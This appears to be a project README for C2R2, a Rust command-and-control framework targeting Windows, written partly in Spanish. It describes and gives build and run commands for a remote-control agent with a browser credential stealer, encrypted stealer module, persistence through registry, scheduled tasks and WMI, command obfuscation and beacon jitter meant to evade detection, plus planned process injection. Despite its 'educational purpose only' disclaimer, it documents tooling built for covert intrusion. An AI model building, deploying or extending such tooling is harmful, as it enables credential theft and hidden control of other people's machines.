# C2R2 v2.0 - Direct Connection
Command & Control Framework written in Rust

[![Rust](https://img.shields.io/badge/Rust-1.90.0-orange.svg)](https://www.rust-lang.org/)
[![License](https://img.shields.io/badge/License-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)

## ⚠️ Educational Purpose Only
**Do not use this tool for illegal activities. This project is for educational and authorized security testing purposes only.**

---

## 🚀 Features

### v2.0 - Direct Connection (Current)
- ✅ **Direct TCP Connection** - No shellcode, no encryption overhead
- ✅ **Multi-Client Support** - Handle multiple agents simultaneously
- ✅ **System Information** - Auto-collect hostname, username, OS, privileges
- ✅ **Remote Command Execution** - Execute arbitrary commands via cmd
- ✅ **Command Obfuscation** - Automatic ArgFuscator-style obfuscation for all commands
- ✅ **File Transfer** - Download/Upload files with Base64 encoding
- ✅ **Beacon Communication** - Configurable intervals with jitter to evade detection
- ✅ **Persistence Mechanisms** - Registry, Scheduled Tasks, WMI Events (APT-like)
- ✅ **Colored CLI** - Beautiful terminal interface with tables
- ✅ **Cross-Compilation** - Build Windows agents from Linux (Kali)
- ✅ **Lightweight Agent** - ~60KB binary, zero dependencies

### Available Commands
```
📋 /list                      - List all connected clients
🎯 /select <id>               - Select a client by ID
📤 /cmd <command>             - Send command to selected client
📡 /cmd_all <command>         - Send command to ALL clients
📥 /download <remote_path>    - Download file from agent
📤 /upload <local> <remote>   - Upload file to agent
🔑 /harvest                   - Steal credentials from browsers
📌 /persist <method>          - Establish persistence (registry|task|wmi|startup)
🧹 /persist_remove            - Remove persistence from agent
📡 /beacon <int:jit>          - Configure beacon interval (e.g., 60:30 = 60s ±30%)
ℹ️  /info <id>                - Show detailed client information
🔄 /deselect                  - Deselect current client
❓ /help                      - Show help menu
👋 /exit, /quit               - Close server
```

---

## 🔧 Installation & Usage

### Prerequisites

#### En Linux/WSL/Kali
```bash
# Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# MinGW-w64 para cross-compilation a Windows
sudo apt install mingw-w64

# Target de Windows para Rust
rustup target add x86_64-pc-windows-gnu
```

### Building the Project

#### 1. Compilar el módulo Stealer (Windows DLL desde Linux)

```bash
# Opción A: Script automatizado
./build-stealer.sh

# Opción B: Manual
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
# Genera: target/x86_64-pc-windows-gnu/release/stealer.dll
```

#### 2. Encriptar el módulo Stealer

```bash
cd builder
cargo run --release -- encrypt-module
# Genera: c2r2-server/modules/stealer.enc y stealer.key
```

#### 3. Compilar el servidor C2

```bash
cd c2r2-server
cargo -p c2r2-server build --release
# Genera: target/release/c2r2-server (Linux/WSL)
```

#### 4. Generar el agente (lightweight)

```bash
cd builder
cargo run --release -- build-agent --name agent1 --server 192.168.1.10:4444
# Genera: output/agent1.exe (~500 KB)
```

**Ver más detalles en [builder/README.md](builder/README.md)**

### Running the C2 Server

```bash
cd c2r2-server
./target/release/c2r2-server

# El servidor escucha en 0.0.0.0:4444 por defecto
```

### Deploying the Agent

```bash
# Transferir el agente a la máquina objetivo (Windows)
# El agente se conecta automáticamente al servidor configurado

# Desde el servidor C2, usar comandos:
/clients              # Ver agentes conectados
/select <id>          # Seleccionar un agente
/upload <file>        # Subir archivo al agente
/harvest              # Ejecutar stealer (requiere módulo encriptado)
```

https://github.com/1N73LL1G3NC3x/Nightmangle/tree/master?tab=readme-ov-file

## ToDo


- [x] Que no aparezca la consola del agente
- [x] Crear un listener para tener multiples conexiones simultaneas con diferentes agentes
- [x] Implementar comunicación tipo beacon con jitter para evasión
- [x] Crear persistencia en Windows (Registry, Scheduled Tasks, WMI Events)
- [x] Implementar ofuscación de comandos con ArgFuscator
- [ ] Mejorar la ofuscación del agente

### Command Obfuscation (ArgFuscator)
- [x] Implementar ofuscación automática de comandos
- [x] Random case changes (wHoAmI)
- [x] Character insertion with carets (who^ami)
- [x] Quote insertion around arguments
- [x] Environment variable substitution (%windir%)
- [x] Aplicar ofuscación a todos los comandos (/cmd, /cmd_all)
- [x] Aplicar ofuscación a comandos de persistencia (registry, task, wmi)

Ver [ARGFUSCATOR_IMPLEMENTATION.md](ARGFUSCATOR_IMPLEMENTATION.md) para más detalles y ejemplos.

### Crear persistencia
- [x] Cuando se ejecute el agente, que se copie a %APPDATA% y se añada al registro para que se ejecute al iniciar sesión o al iniciar el sistema.
- [ ] Que se pueda inyectar en un proceso legítimo (explorer.exe, svchost.exe, etc)


### Listener
- [x] Crear un listener con sockets para tener multiples conexiones simultaneas con diferentes agentes
- [x] Implementar comunicación asíncrona con beacon/jitter para evasión
- [x] Sleep con jitter y exponential backoff para evitar detección heurística
- [ ] Crear un servidor que se encargue de recibir las conexiones de los agentes y enviarles comandos y que este servidor se comunique con la interfaz C2 (Telegram bot, web, etc)

### Interfaz C2
- [ ] Crear una interfaz mediante Telegram bot que permita enviar comandos y recibir respuestas de los agentes

